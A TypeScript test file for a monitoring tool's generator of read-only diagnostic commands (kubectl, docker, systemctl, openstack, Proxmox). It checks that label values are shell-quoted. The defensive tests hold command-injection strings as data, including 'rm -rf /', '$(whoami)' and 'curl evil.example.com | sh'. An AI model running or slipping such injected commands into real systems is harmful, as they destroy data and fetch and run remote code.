import SlackUtil from "../../../../Server/Utils/Workspace/Slack/Slack";
import { JSONObject } from "../../../../Types/JSON";
import { marked, Token, Tokens } from "marked";
import MonitorType from "../../../../Types/Monitor/MonitorType";
import MonitorStep from "../../../../Types/Monitor/MonitorStep";
import {
  getAllKubernetesAlertTemplates,
  KubernetesAlertTemplate,
} from "../../../../Types/Monitor/KubernetesAlertTemplates";
import ObjectID from "../../../../Types/ObjectID";
import SeriesDebugHints, {
  SeriesDebugCommand,
} from "../../../../Types/Monitor/SeriesContext/SeriesDebugHints";
import { WORD_JOINER } from "../../../../Utils/Markdown/MarkdownEscape";

/*
 * These commands are printed into an alert description and rendered on
 * the alert page with a Copy button, which makes them the highest-trust
 * text OneUptime emits: a tired engineer pastes them into a production
 * shell without reading. Three invariants therefore matter more than the
 * exact wording of any one command, and each has its own block below:
 *
 *   1. READ-ONLY. Nothing here may mutate, restart or delete.
 *
 *   2. NEVER HALF-FILLED. A command is emitted only when every
 *      identifier it interpolates is known, so no `kubectl logs  -n `
 *      ever reaches a human.
 *
 *   3. SHELL-SAFE. Label values are telemetry - an agent, a Prometheus
 *      scrape, or a user's own oneuptime.captureMetric() call chose
 *      them - so a value containing shell metacharacters must render as
 *      an inert argument, not as a second command.
 */

function getCommandStrings(input: {
  monitorType: MonitorType;
  seriesLabels: JSONObject;
}): Array<string> {
  return SeriesDebugHints.getDebugCommands(input).map(
    (command: SeriesDebugCommand) => {
      return command.command;
    },
  );
}

const KUBERNETES_POD_LABELS: JSONObject = {
  "resource.k8s.namespace.name": "prod",
  "resource.k8s.pod.name": "checkout-7d9f-2xk",
  "resource.k8s.container.name": "app",
  "resource.k8s.node.name": "ip-10-0-3-14",
};

describe("SeriesDebugHints", () => {
  describe("quoteForShell", () => {
    test("leaves an ordinary object name unquoted so it stays readable", () => {
      expect(SeriesDebugHints.quoteForShell("checkout-7d9f-2xk")).toBe(
        "checkout-7d9f-2xk",
      );
      expect(SeriesDebugHints.quoteForShell("/var/lib/docker")).toBe(
        "/var/lib/docker",
      );
      expect(SeriesDebugHints.quoteForShell("osd.12")).toBe("osd.12");
    });

    test("single-quotes anything carrying a shell metacharacter", () => {
      expect(SeriesDebugHints.quoteForShell("web; rm -rf /")).toBe(
        "'web; rm -rf /'",
      );
      expect(SeriesDebugHints.quoteForShell("a b")).toBe("'a b'");
      expect(SeriesDebugHints.quoteForShell("$(whoami)")).toBe("'$(whoami)'");
      expect(SeriesDebugHints.quoteForShell("`id`")).toBe("'`id`'");
      expect(SeriesDebugHints.quoteForShell("a&&b")).toBe("'a&&b'");
      expect(SeriesDebugHints.quoteForShell("a|b")).toBe("'a|b'");
      expect(SeriesDebugHints.quoteForShell("a\nb")).toBe("'a\nb'");
    });

    test("escapes an embedded single quote without ending the quoting", () => {
      /*
       * The close/escape/reopen dance. A naive implementation would
       * produce 'a'b', which terminates the quoted string early and
       * leaves `b` as a separate shell word.
       */
      expect(SeriesDebugHints.quoteForShell("a'b")).toBe(`'a'\\''b'`);
    });

    test("a value trying to break out stays inside one argument", () => {
      const quoted: string = SeriesDebugHints.quoteForShell(
        `'; curl evil.example.com | sh; echo '`,
      );

      /*
       * Every quote in the value is escaped, so the only unescaped
       * quotes left are the wrapper's own opening and closing pair.
       */
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      expect(quoted.split(`'\\''`).join("")).not.toContain("''");
    });
  });

  describe("Kubernetes", () => {
    test("names the pod, container and namespace in the first commands", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      });

      expect(commands).toContain(
        "kubectl describe pod checkout-7d9f-2xk -n prod",
      );
      expect(commands).toContain(
        "kubectl logs checkout-7d9f-2xk -c app -n prod --tail=200",
      );
      expect(commands).toContain(
        "kubectl logs checkout-7d9f-2xk -c app -n prod --previous --tail=200",
      );
      expect(commands).toContain(
        "kubectl top pod checkout-7d9f-2xk -n prod --containers",
      );
    });

    test("adds node-level commands when the series names a node", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      });

      expect(commands).toContain("kubectl describe node ip-10-0-3-14");
      expect(commands).toContain(
        "kubectl get pods --all-namespaces --field-selector spec.nodeName=ip-10-0-3-14 -o wide",
      );
    });

    /*
     * High Node Disk Usage (#9645): which pod fills the node's disk is in
     * the kubelet's own reading - each pod's ephemeral storage, and the
     * node's root and image filesystems - read-only through the API
     * server's node proxy, after the node's conditions and its pods.
     */
    test("a node's alert reads the kubelet's own reading of its disks and its pods' storage, third", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: { "resource.k8s.node.name": "ip-10-0-3-14" },
      });

      expect(commands).toEqual([
        "kubectl describe node ip-10-0-3-14",
        "kubectl get pods --all-namespaces --field-selector spec.nodeName=ip-10-0-3-14 -o wide",
        "kubectl get --raw /api/v1/nodes/ip-10-0-3-14/proxy/stats/summary",
      ]);
    });

    /*
     * Node Image Disk Almost Full (#9843) groups by the node as High Node
     * Disk Usage does, so its alert hands over the same commands: the
     * kubelet's reading is the only place the node's own image filesystem
     * (node.runtime.imageFs) shows, since the agent's collector exports none.
     */
    test.each(["k8s-high-disk-usage", "k8s-node-image-disk-almost-full"])(
      "%s's alert starts with the node, its pods and the kubelet's reading of its disks",
      (templateId: string) => {
        const template: KubernetesAlertTemplate | undefined =
          getAllKubernetesAlertTemplates().find(
            (candidate: KubernetesAlertTemplate) => {
              return candidate.id === templateId;
            },
          );
        expect(template).toBeDefined();

        const step: MonitorStep = template!.getMonitorStep({
          clusterIdentifier: "prod-eu",
          onlineMonitorStatusId: ObjectID.generate(),
          offlineMonitorStatusId: ObjectID.generate(),
          defaultIncidentSeverityId: ObjectID.generate(),
          defaultAlertSeverityId: ObjectID.generate(),
          monitorName: "Test Monitor",
        });
        const seriesLabels: JSONObject = {};
        for (const key of MonitorStep.getGroupByAttributeKeys(step)) {
          seriesLabels[key] = "ip-10-0-3-14";
        }

        expect(Object.keys(seriesLabels)).toEqual(["resource.k8s.node.name"]);
        expect(
          getCommandStrings({
            monitorType: MonitorType.Kubernetes,
            seriesLabels,
          }),
        ).toEqual([
          "kubectl describe node ip-10-0-3-14",
          "kubectl get pods --all-namespaces --field-selector spec.nodeName=ip-10-0-3-14 -o wide",
          "kubectl get --raw /api/v1/nodes/ip-10-0-3-14/proxy/stats/summary",
        ]);
      },
    );

    test("quotes a node name that needs it inside the proxy path", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: { "resource.k8s.node.name": "node; rm -rf /" },
      });

      expect(commands[2]).toBe(
        "kubectl get --raw /api/v1/nodes/'node; rm -rf /'/proxy/stats/summary",
      );
    });

    test("omits -n rather than guessing when the namespace is unknown", () => {
      /*
       * Guessing "default" sends the engineer to the wrong namespace and
       * returns "not found". Omitting the flag uses their current
       * context, which is the correct fallback.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: { "resource.k8s.pod.name": "web-1" },
      });

      expect(commands).toContain("kubectl describe pod web-1");
      expect(
        commands.some((command: string) => {
          return command.includes("-n ");
        }),
      ).toBe(false);
    });

    test("omits -c rather than emitting an empty container flag", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.pod.name": "web-1",
          "resource.k8s.namespace.name": "prod",
        },
      });

      expect(commands).toContain("kubectl logs web-1 -n prod --tail=200");
    });

    test("emits nothing at all when the series names nothing kubectl can address", () => {
      /*
       * A container is addressed through its pod, and a service name is no
       * Kubernetes object: neither is enough for a command.
       */
      expect(
        getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: { "resource.k8s.container.name": "app" },
        }),
      ).toEqual([]);
      expect(
        getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: { "resource.service.name": "checkout-api" },
        }),
      ).toEqual([]);
    });

    /*
     * Regression (#9738): PVC Almost Full grouped by a claim and its
     * namespace, and SeriesDebugHints knew no command for a claim, so its
     * alert came with nothing to run.
     */
    describe("a persistent volume claim", () => {
      test("is described in its namespace, then the storage classes say whether it can grow", () => {
        expect(
          getCommandStrings({
            monitorType: MonitorType.Kubernetes,
            seriesLabels: {
              "resource.k8s.namespace.name": "prod",
              "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
            },
          }),
        ).toEqual([
          "kubectl describe pvc data-postgres-0 -n prod",
          "kubectl get storageclass",
        ]);
      });

      test("says why each command is there: what describe shows, and the column that answers expansion", () => {
        const commands: Array<SeriesDebugCommand> =
          SeriesDebugHints.getDebugCommands({
            monitorType: MonitorType.Kubernetes,
            seriesLabels: {
              "resource.k8s.namespace.name": "prod",
              "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
            },
          });

        expect(commands[0]!.purpose).toContain("pods that mount it");
        expect(commands[1]!.purpose).toContain("ALLOWVOLUMEEXPANSION");
      });

      test("omits -n rather than guessing when the claim's namespace is unknown", () => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            "k8s.persistentvolumeclaim.name": "data-postgres-0",
          },
        });

        expect(commands[0]).toBe("kubectl describe pvc data-postgres-0");
        expect(
          commands.some((command: string) => {
            return command.includes("-n ");
          }),
        ).toBe(false);
      });

      test("a claim's namespace does not add the namespace-wide commands", () => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            "resource.k8s.namespace.name": "prod",
            "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
            "resource.k8s.cluster.name": "prod-eu",
          },
        });

        expect(
          commands.some((command: string) => {
            return (
              command.startsWith("kubectl top") ||
              command.startsWith("kubectl get nodes") ||
              command.startsWith("kubectl get pods")
            );
          }),
        ).toBe(false);
      });

      test("a hostile claim name stays one inert argument", () => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            "resource.k8s.namespace.name": "prod",
            "resource.k8s.persistentvolumeclaim.name": "data; rm -rf /",
          },
        });

        expect(commands[0]).toBe(
          "kubectl describe pvc 'data; rm -rf /' -n prod",
        );
      });
    });

    /*
     * Regression (#9738): Namespace Daily Cost Over Budget groups by the
     * namespace alone, and a namespace alone got no command.
     */
    describe("a namespace on its own", () => {
      const NAMESPACE_ONLY: JSONObject = {
        "resource.k8s.namespace.name": "payments",
      };

      test("shows what its pods use, what they request and how many replicas each workload runs", () => {
        expect(
          getCommandStrings({
            monitorType: MonitorType.Kubernetes,
            seriesLabels: NAMESPACE_ONLY,
          }),
        ).toEqual([
          "kubectl top pods -n payments --sort-by=cpu",
          "kubectl get pods -n payments -o custom-columns='NAME:.metadata.name,CPU_REQUESTS:.spec.containers[*].resources.requests.cpu,MEMORY_REQUESTS:.spec.containers[*].resources.requests.memory,NODE:.spec.nodeName'",
          "kubectl get deployments,statefulsets,daemonsets -n payments",
        ]);
      });

      test("keeps the custom-columns JSONPath inside single quotes, so zsh does not read [*] as a glob", () => {
        const requests: string = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: NAMESPACE_ONLY,
        })[1]!;

        const quoted: string = requests.slice(
          requests.indexOf("'"),
          requests.lastIndexOf("'") + 1,
        );

        expect(quoted).toContain("[*]");
        expect(requests.replace(quoted, "")).not.toContain("[*]");
      });

      test("wins over the cluster when the series names both", () => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            ...NAMESPACE_ONLY,
            "resource.k8s.cluster.name": "prod-eu",
          },
        });

        expect(commands[0]).toBe("kubectl top pods -n payments --sort-by=cpu");
        expect(commands).not.toContain("kubectl top nodes");
      });

      test("is not added when the series names a pod or a workload in it", () => {
        for (const seriesLabels of [
          { ...NAMESPACE_ONLY, "resource.k8s.pod.name": "api-1" },
          { ...NAMESPACE_ONLY, "resource.k8s.deployment.name": "api" },
          { ...NAMESPACE_ONLY, "resource.k8s.hpa.name": "api" },
        ]) {
          expect(
            getCommandStrings({
              monitorType: MonitorType.Kubernetes,
              seriesLabels,
            }).some((command: string) => {
              return command.includes("--sort-by=cpu");
            }),
          ).toBe(false);
        }
      });

      test("a hostile namespace stays one inert argument in every command", () => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            "resource.k8s.namespace.name": "prod$(curl evil.example.com)",
          },
        });

        expect(commands.length).toBe(3);

        for (const command of commands) {
          expect(command).toContain(" -n 'prod$(curl evil.example.com)'");
        }
      });
    });

    /*
     * Regression (#9738): Cluster Daily Cost Over Budget and High Idle Spend
     * group by the cluster alone, and a cluster alone got no command.
     */
    describe("a cluster on its own", () => {
      test("shows the nodes it pays for, newest last, then how much of each is used", () => {
        expect(
          getCommandStrings({
            monitorType: MonitorType.Kubernetes,
            seriesLabels: { "resource.k8s.cluster.name": "prod-eu" },
          }),
        ).toEqual([
          "kubectl get nodes -L node.kubernetes.io/instance-type -L topology.kubernetes.io/zone --sort-by=.metadata.creationTimestamp",
          "kubectl top nodes",
        ]);
      });

      test("never puts the cluster's name on the command line: it is OneUptime's name, not a kubectl context", () => {
        for (const command of getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: { "resource.k8s.cluster.name": "prod-eu; rm -rf /" },
        })) {
          expect(command).not.toContain("prod-eu");
          expect(command).not.toContain("--context");
        }
      });

      test("is not added when the series names a node or a pod", () => {
        const nodeCommands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            "resource.k8s.cluster.name": "prod-eu",
            "resource.k8s.node.name": "ip-10-0-3-14",
          },
        });
        const podCommands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {
            ...KUBERNETES_POD_LABELS,
            "resource.k8s.cluster.name": "prod-eu",
          },
        });

        expect(nodeCommands[0]).toBe("kubectl describe node ip-10-0-3-14");
        expect(nodeCommands).not.toContain("kubectl top nodes");
        expect(podCommands[0]).toBe(
          "kubectl describe pod checkout-7d9f-2xk -n prod",
        );
        expect(podCommands).not.toContain("kubectl top nodes");
      });
    });

    /*
     * The four templates #9738 found without a first command, read from the
     * templates themselves: a template that changes what it groups by is
     * checked against what it groups by now, not against a copy here.
     */
    describe("the shipped templates that group by a claim, a namespace or a cluster", () => {
      function firstCommandFor(templateId: string): string {
        const template: KubernetesAlertTemplate | undefined =
          getAllKubernetesAlertTemplates().find(
            (candidate: KubernetesAlertTemplate) => {
              return candidate.id === templateId;
            },
          );

        expect(template).toBeDefined();

        const step: MonitorStep = template!.getMonitorStep({
          clusterIdentifier: "prod-eu",
          onlineMonitorStatusId: ObjectID.generate(),
          offlineMonitorStatusId: ObjectID.generate(),
          defaultIncidentSeverityId: ObjectID.generate(),
          defaultAlertSeverityId: ObjectID.generate(),
          monitorName: "Test Monitor",
        });

        const seriesLabels: JSONObject = {};

        for (const key of MonitorStep.getGroupByAttributeKeys(step)) {
          seriesLabels[key] = {
            "resource.k8s.cluster.name": "prod-eu",
            "resource.k8s.namespace.name": "payments",
            "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
          }[key] as string;
        }

        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels,
        });

        expect(commands.length).toBeGreaterThan(0);

        return commands[0]!;
      }

      test.each([
        [
          "k8s-pvc-almost-full",
          "kubectl describe pvc data-postgres-0 -n payments",
        ],
        [
          "k8s-namespace-daily-cost",
          "kubectl top pods -n payments --sort-by=cpu",
        ],
        [
          "k8s-cluster-daily-cost",
          "kubectl get nodes -L node.kubernetes.io/instance-type -L topology.kubernetes.io/zone --sort-by=.metadata.creationTimestamp",
        ],
        [
          "k8s-high-idle-cost",
          "kubectl get nodes -L node.kubernetes.io/instance-type -L topology.kubernetes.io/zone --sort-by=.metadata.creationTimestamp",
        ],
      ])("%s starts with %s", (templateId: string, expected: string) => {
        expect(firstCommandFor(templateId)).toBe(expected);
      });
    });

    test.each([
      [
        "resource.k8s.deployment.name",
        "checkout",
        "rollout status deployment/checkout",
      ],
      [
        "resource.k8s.statefulset.name",
        "kafka",
        "rollout status statefulset/kafka",
      ],
      ["resource.k8s.daemonset.name", "fluentd", "describe daemonset fluentd"],
      ["resource.k8s.job.name", "nightly", "describe job nightly"],
      ["resource.k8s.hpa.name", "web-hpa", "describe hpa web-hpa"],
    ])(
      "%s produces its own object-specific command",
      (key: string, value: string, expectedFragment: string) => {
        const commands: Array<string> = getCommandStrings({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: { [key]: value },
        });

        expect(
          commands.some((command: string) => {
            return command.includes(expectedFragment);
          }),
        ).toBe(true);
      },
    );

    test("a hostile pod name cannot become a second command", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.pod.name": "web; curl evil.example.com | sh",
          "resource.k8s.namespace.name": "prod",
        },
      });

      for (const command of commands) {
        /*
         * The dangerous substring may appear, but only INSIDE the single
         * quotes that make it one inert argument.
         */
        if (command.includes("curl evil.example.com")) {
          expect(command).toContain("'web; curl evil.example.com | sh'");
        }
      }
    });
  });

  describe("Docker and Podman", () => {
    test("uses the docker CLI for a Docker monitor", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Docker,
        seriesLabels: { "resource.container.name": "nginx" },
      });

      expect(commands).toContain("docker logs --tail 200 nginx");
      expect(commands).toContain("docker stats --no-stream nginx");
      expect(commands).toContain("docker top nginx");
    });

    test("uses the podman CLI for a Podman monitor", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Podman,
        seriesLabels: { "resource.container.name": "nginx" },
      });

      expect(commands).toContain("podman logs --tail 200 nginx");
      expect(
        commands.every((command: string) => {
          return !command.startsWith("docker ");
        }),
      ).toBe(true);
    });

    test("surfaces the exit code and OOM flag, which is what the page is about", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Docker,
        seriesLabels: { "resource.container.name": "nginx" },
      });

      expect(
        commands.some((command: string) => {
          return (
            command.includes("docker inspect") &&
            command.includes("OOMKilled") &&
            command.includes("ExitCode")
          );
        }),
      ).toBe(true);
    });

    test("emits nothing without a container name", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Docker,
          seriesLabels: { "resource.container.image.name": "nginx:1.25" },
        }),
      ).toEqual([]);
    });
  });

  describe("Docker Swarm", () => {
    test("adds service-level commands on top of the container ones", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.DockerSwarm,
        seriesLabels: {
          "container.name": "web.1.abc123",
          "docker.swarm.service.name": "web",
        },
      });

      expect(commands).toContain("docker logs --tail 200 web.1.abc123");
      expect(commands).toContain("docker service ps web --no-trunc");
      expect(commands).toContain("docker service logs --tail 200 web");
    });

    test("reads the unprefixed container.name the swarm agent emits", () => {
      /*
       * Unlike Docker/Podman, the docker_stats receiver in the Swarm
       * agent keeps container identity in DATAPOINT labels, so the key
       * has no `resource.` prefix.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.DockerSwarm,
        seriesLabels: { "container.name": "web.1.abc123" },
      });

      expect(commands.length).toBeGreaterThan(0);
    });
  });

  describe("Host", () => {
    test("investigates the mount that actually filled up", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { mountpoint: "/var", device: "/dev/nvme0n1p2" },
      });

      expect(commands).toContain("df -h /var && df -i /var");
      expect(
        commands.some((command: string) => {
          return command.includes("du -xh --max-depth=1 /var");
        }),
      ).toBe(true);
      expect(
        commands.some((command: string) => {
          return command.includes("iostat -x 1 3 /dev/nvme0n1p2");
        }),
      ).toBe(true);
    });

    test("checks inodes, not just bytes", () => {
      /*
       * "df -h says 60%" plus "disk full" errors is the classic inode
       * exhaustion signature, and it is invisible without df -i.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { mountpoint: "/var" },
      });

      expect(
        commands.some((command: string) => {
          return command.includes("df -i");
        }),
      ).toBe(true);
    });

    test("a mountpoint with a space stays one argument", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { mountpoint: "/mnt/my volume" },
      });

      expect(commands[0]).toContain("'/mnt/my volume'");
    });

    test("a failed systemd unit is looked at by its own name, read-only", () => {
      // The Systemd Unit Failed template groups by the unit's resource attribute.
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { "resource.systemd.unit.name": "nginx.service" },
      });

      expect(commands).toEqual([
        "systemctl status nginx.service --no-pager",
        "journalctl -u nginx.service -n 50 --no-pager",
      ]);
    });

    test("a unit name that is not a plain word stays one argument", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Host,
        seriesLabels: { "systemd.unit.name": "getty@tty 1.service" },
      });

      expect(commands[0]).toContain("'getty@tty 1.service'");
      expect(commands[1]).toContain("-u 'getty@tty 1.service'");
    });

    test("a Server monitor gets the same host commands", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Server,
          seriesLabels: { diskPath: "/var" },
        }).length,
      ).toBeGreaterThan(0);
    });

    test("emits nothing for a host-scalar series with no entity", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Host,
          seriesLabels: { "host.name": "prod-db-01" },
        }),
      ).toEqual([]);
    });
  });

  describe("OpenStack", () => {
    const REGION: string = "openstack --os-region-name RegionOne";

    function openstackCommands(seriesLabels: JSONObject): Array<string> {
      return getCommandStrings({
        monitorType: MonitorType.OpenStack,
        seriesLabels: { "openstack.region.name": "RegionOne", ...seriesLabels },
      });
    }

    test("a nova-compute worker is looked up by its short name, with what runs on it", () => {
      expect(
        openstackCommands({ hostname: "compute-01", service: "nova-compute" }),
      ).toEqual([
        `${REGION} compute service list --host compute-01 --service nova-compute --long`,
        `${REGION} server list --all-projects --host compute-01`,
        `${REGION} hypervisor list --matching compute-01 --long`,
      ]);
    });

    test("a scheduler has no instances or hypervisor to offer", () => {
      expect(
        openstackCommands({ hostname: "ctl-01", service: "nova-scheduler" }),
      ).toEqual([
        `${REGION} compute service list --host ctl-01 --service nova-scheduler --long`,
      ]);
    });

    test("a worker's service without a host asks about every host", () => {
      expect(openstackCommands({ service: "nova-conductor" })).toEqual([
        `${REGION} compute service list --service nova-conductor --long`,
      ]);
    });

    test("a Neutron agent is looked up among the host's agents", () => {
      expect(
        openstackCommands({ hostname: "net-01", service: "neutron-l3-agent" }),
      ).toEqual([`${REGION} network agent list --host net-01 --long`]);
    });

    test("a Cinder service keeps its backend in its host, and shows its pools", () => {
      expect(
        openstackCommands({ hostname: "ctl-01@lvm", service: "cinder-volume" }),
      ).toEqual([
        `${REGION} volume service list --host ctl-01@lvm --service cinder-volume --long`,
        `${REGION} volume backend pool list --long`,
      ]);
    });

    test("a hypervisor is looked up by its full name", () => {
      expect(
        openstackCommands({ hostname: "compute-01.example.internal" }),
      ).toEqual([`${REGION} hypervisor show compute-01.example.internal`]);
    });

    test("an instance shows its fault and what was done to it", () => {
      expect(openstackCommands({ uuid: "3f1c", name: "web-01" })).toEqual([
        `${REGION} server show 3f1c`,
        `${REGION} server event list 3f1c --long`,
      ]);
    });

    test("a router shows its gateway and the agents holding it", () => {
      expect(openstackCommands({ router_id: "r-1" })).toEqual([
        `${REGION} router show r-1`,
        `${REGION} network agent list --router r-1 --long`,
      ]);
    });

    test("a network shows its addresses and the floating IPs taken from it", () => {
      expect(
        openstackCommands({ network_id: "n-1", network_name: "public" }),
      ).toEqual([
        `${REGION} ip availability show n-1`,
        `${REGION} floating ip list --network n-1 --long`,
      ]);
    });

    test("a volume is named by its id only on a series that is a volume's", () => {
      expect(
        openstackCommands({ id: "v-1", name: "data", volume_type: "ssd" }),
      ).toEqual([`${REGION} volume show v-1`]);

      // An empty label is still the label: a volume with no type is a volume.
      expect(openstackCommands({ id: "v-1", volume_type: "" })).toEqual([
        `${REGION} volume show v-1`,
      ]);

      // `id` is a router's, a floating IP's or an image's on another series.
      expect(openstackCommands({ id: "x-1" })).toEqual([
        `${REGION} endpoint list`,
      ]);
    });

    test("a storage pool shows every pool and the service behind them", () => {
      expect(
        openstackCommands({ name: "ctl@lvm#pool", volume_backend_name: "lvm" }),
      ).toEqual([
        `${REGION} volume backend pool list --long`,
        `${REGION} volume service list --service cinder-volume --long`,
      ]);
    });

    test("a project shows what it has used and its quotas", () => {
      expect(
        openstackCommands({ tenant_id: "4f2d", tenant: "payments" }),
      ).toEqual([
        `${REGION} limits show --absolute --project 4f2d`,
        `${REGION} quota show 4f2d`,
      ]);
    });

    test("a status word says whose it is: Nova's are capitals, Cinder's are not", () => {
      expect(openstackCommands({ status: "ERROR" })).toEqual([
        `${REGION} server list --all-projects --status ERROR --long`,
      ]);
      expect(openstackCommands({ status: "error_deleting" })).toEqual([
        `${REGION} volume list --all-projects --status error_deleting --long`,
      ]);
    });

    test.each([
      ["identity", "token issue"],
      ["compute", "compute service list --long"],
      ["volume", "volume service list --long"],
      ["image", "image list --limit 1"],
      ["placement", "endpoint list --service placement"],
    ])(
      "a whole %s API asks whether it answers",
      (openstackService: string, command: string) => {
        expect(
          openstackCommands({ openstack_service: openstackService }),
        ).toEqual([`${REGION} ${command}`]);
      },
    );

    test("a whole network API also shows what Neutron only counts per region", () => {
      expect(openstackCommands({ openstack_service: "network" })).toEqual([
        `${REGION} network agent list --long`,
        `${REGION} router list --long`,
        `${REGION} floating ip list --long`,
      ]);
    });

    test("a series nothing recognises still gets a first command", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.OpenStack,
          seriesLabels: { something_else: "x" },
        }),
      ).toEqual(["openstack endpoint list"]);
    });

    test("no region asks the shell's own", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.OpenStack,
          seriesLabels: { router_id: "r-1" },
        }),
      ).toEqual([
        "openstack router show r-1",
        "openstack network agent list --router r-1 --long",
      ]);
    });

    test("labels read the same off the resource, as a region does there", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.OpenStack,
          seriesLabels: {
            "resource.openstack.region.name": "RegionOne",
            router_id: "r-1",
          },
        }),
      ).toContain(`${REGION} router show r-1`);
    });

    test("a region, host or status with shell metacharacters stays one inert argument", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.OpenStack,
        seriesLabels: {
          "openstack.region.name": "Region One",
          hostname: "h; rm -rf /",
          service: "nova-compute",
        },
      });

      expect(commands[0]).toBe(
        "openstack --os-region-name 'Region One' compute service list --host 'h; rm -rf /' --service nova-compute --long",
      );

      expect(
        getCommandStrings({
          monitorType: MonitorType.OpenStack,
          seriesLabels: { status: "$(reboot)" },
        }),
      ).toEqual([
        "openstack volume list --all-projects --status '$(reboot)' --long",
      ]);

      expect(
        getCommandStrings({
          monitorType: MonitorType.OpenStack,
          seriesLabels: { uuid: "a'b" },
        })[0],
      ).toBe("openstack server show 'a'\\''b'");
    });
  });

  describe("Proxmox and Ceph", () => {
    test("Proxmox covers both the VM and the LXC spelling of a bare guest id", () => {
      /*
       * A hand-built monitor grouped on `vmid` alone does not say
       * whether the guest is a VM or an LXC container, so both CLIs are
       * offered - the wrong one just reports no such guest.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { vmid: "100" },
      });

      expect(commands).toContain("qm status 100 --verbose");
      expect(commands).toContain("pct status 100");
    });

    test("Proxmox reads the composite id the shipped templates group by", () => {
      /*
       * This is the shape the shipped templates actually produce:
       * pve-exporter puts identity in one `id` datapoint label, and the
       * templates group by it. Without parsing it, a Proxmox alert
       * carried an identity nothing could act on.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "qemu/100" },
      });

      expect(commands).toContain("qm status 100 --verbose");
      // A qemu guest is not an LXC container, so pct is not offered.
      expect(
        commands.some((command: string) => {
          return command.startsWith("pct ");
        }),
      ).toBe(false);
    });

    test("Proxmox offers only the LXC CLI for an lxc/ id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "lxc/101" },
      });

      expect(commands).toContain("pct status 101");
      expect(
        commands.some((command: string) => {
          return command.startsWith("qm ");
        }),
      ).toBe(false);
    });

    test("Proxmox prefers the agent's derived pve.type / pve.id over the raw id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: {
          id: "qemu/100",
          "pve.type": "lxc",
          "pve.id": "101",
        },
      });

      expect(commands).toContain("pct status 101");
    });

    test("Proxmox takes the last segment of a multi-segment storage id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "storage/pve1/local-lvm" },
      });

      expect(commands).toContain("pvesm status --storage local-lvm");
    });

    test("Proxmox investigates the node named by a node/ id", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "node/pve1" },
      });

      expect(commands).toContain("pvecm status");
      expect(commands).toContain("pvesh get /nodes/pve1/status");
    });

    test("an unrecognised Proxmox id still gets a first command", () => {
      /*
       * Cluster-scoped ids ("cluster/production") and any future id
       * shape must not leave the alert with nothing to run.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Proxmox,
        seriesLabels: { id: "cluster/production" },
      });

      expect(commands).toContain("pvesh get /cluster/resources");
    });

    test("VMware reads the resource.-prefixed vcenter attributes the templates group by", () => {
      /*
